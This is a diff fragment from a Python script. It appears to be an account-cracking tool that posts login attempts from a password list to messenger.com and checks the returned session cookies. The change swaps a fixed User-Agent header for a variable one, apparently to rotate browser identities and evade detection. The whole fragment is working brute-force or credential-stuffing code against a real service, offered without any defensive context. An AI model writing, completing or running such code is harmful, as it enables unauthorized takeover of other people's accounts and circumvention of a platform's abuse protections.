@@ -1409,7 +1409,7 @@ def rndm5(uid,passlist):
 'Sec-Fetch-Site': 'same-origin',
 'Sec-Fetch-User': '?1',
 'Upgrade-Insecure-Requests': '1',
-'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+'User-Agent': au,
 'Content-Length': '417',}
                         response=session.post(f'https://www.messenger.com/login/password/',data=data,headers=headers).text
                         log_cookies=session.cookies.get_dict().keys()
